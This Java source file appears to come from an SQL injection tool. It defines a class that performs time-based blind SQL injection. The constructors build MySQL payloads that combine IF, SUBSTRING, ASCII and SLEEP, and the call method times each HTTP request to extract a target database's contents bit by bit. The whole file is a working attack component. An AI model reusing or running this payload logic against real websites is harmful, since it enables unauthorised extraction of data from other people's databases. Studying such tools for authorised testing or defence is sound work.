package com.jsql.model.blind;

import java.util.Calendar;
import java.util.Date;
import java.util.List;

import com.jsql.model.blind.diff_match_patch.Diff;

/**
 * Define a call HTTP to the server, require the associated url, character position and bit.
 * diffSeconds represents the response time of the current page
 */
public class TimeCallable extends AbstractBlindCallable {
    /**
     * Time before the url call.
     */
    private Calendar calendar1 = Calendar.getInstance();
    
    /**
     * Time at the end of the url call.
     */
    private Calendar calendar2 = Calendar.getInstance();
    
    /**
     * Current page loading time.
     */
    private long diffSeconds;

    /**
     * Constructor for preparation and blind confirmation.
     * @param inj
     */
    TimeCallable(String inj) {
        this.blindUrl = "+and+if(" + inj + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }
    
    /**
     * Constructor for bit test.
     * @param inj
     * @param indexCharacter
     * @param bit
     */
    TimeCallable(String inj, int indexCharacter, int bit) {
        this.blindUrl = "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
        this.currentIndex = indexCharacter;
        this.currentBit = bit;
    }

    public TimeCallable(String inj, int indexCharacter, boolean isLengthTest) {
        this.blindUrl = "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
        this.currentIndex = indexCharacter;
        this.isLengthTest = isLengthTest;
    }
    
    public boolean isTrue() {
        return this.diffSeconds < ConcreteTimeInjection.SLEEP;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model.
     * Calculate the response time of the current page.
     * @return Functional Time callable
     */
    @Override
    public TimeCallable call() throws Exception {
        this.calendar1.setTime(new Date());
        ConcreteTimeInjection.callUrl(blindUrl);
        this.calendar2.setTime(new Date());
        long milliseconds1 = calendar1.getTimeInMillis();
        long milliseconds2 = calendar2.getTimeInMillis();
        long diff = milliseconds2 - milliseconds1;
        this.diffSeconds = diff / 1000;
        return this;
    }

    @Override
    public List<Diff> getOpcodes() {
        return null;
    }
}
